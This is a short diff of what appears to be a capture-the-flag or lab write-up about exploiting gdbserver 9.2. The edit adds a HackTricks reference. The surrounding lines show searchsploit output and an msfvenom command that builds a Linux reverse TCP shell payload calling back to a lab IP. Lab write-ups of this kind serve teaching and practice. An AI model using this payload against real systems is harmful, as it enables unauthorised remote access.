@@ -61,7 +61,7 @@ GNU gdbserver 9.2 - Remote Command Execution (RC | linux/remote/50539.py
 ------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-24. I used metasploit to exploit this
+24. I used metasploit to exploit gdbserver (reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver)
 ```shell
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.13.251 LPORT=7777 PrependFork=true -f elf -o exploit.elf
 ```
